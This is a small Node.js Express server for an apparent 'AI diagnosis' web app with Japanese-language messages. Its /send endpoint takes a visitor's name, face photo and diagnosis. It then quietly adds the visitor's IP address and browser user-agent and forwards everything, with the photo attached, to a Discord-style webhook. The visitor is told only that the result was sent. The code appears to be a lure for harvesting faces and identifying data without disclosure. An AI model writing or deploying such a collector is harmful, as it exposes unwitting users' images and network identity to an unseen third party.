require('dotenv').config();
const express = require('express');
const app = express();
const fetch = require('node-fetch');
const FormData = require('form-data');
const cors = require('cors');

const rateLimitMap = new Map(); // IP -> last timestamp

app.use(cors());
app.use(express.json({ limit: '5mb' }));
app.use(express.static('public'));

app.post('/send', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'];
  const now = Date.now();

  if (rateLimitMap.has(ip) && now - rateLimitMap.get(ip) < 30 * 1000) {
    return res.status(429).json({ message: "スパム防止：少し待ってから再度お試しください。" });
  }
  rateLimitMap.set(ip, now);

  const { username, image, diagnosis } = req.body;
  if (!image || !username) return res.status(400).json({ message: "入力エラー" });

  const payload = {
    embeds: [{
      title: '🧠 AI診断送信',
      description: `**名前**: ${username}\n**診断結果**: ${diagnosis}\n**IP**: ${ip}\n**UA**: ${ua}`,
      image: { url: 'attachment://face.png' },
      timestamp: new Date()
    }],
    username: "診断Bot"
  };

  const imageBuffer = Buffer.from(image.split(",")[1], 'base64');
  const form = new FormData();
  form.append('payload_json', JSON.stringify(payload));
  form.append('file', imageBuffer, 'face.png');

  try {
    await fetch(process.env.WEBHOOK_URL, {
      method: 'POST',
      body: form
    });
    res.json({ message: "診断結果が送信されました！" });
  } catch (err) {
    console.error("Webhook送信失敗:", err);
    res.status(500).json({ message: "送信エラー" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 http://localhost:${PORT}`));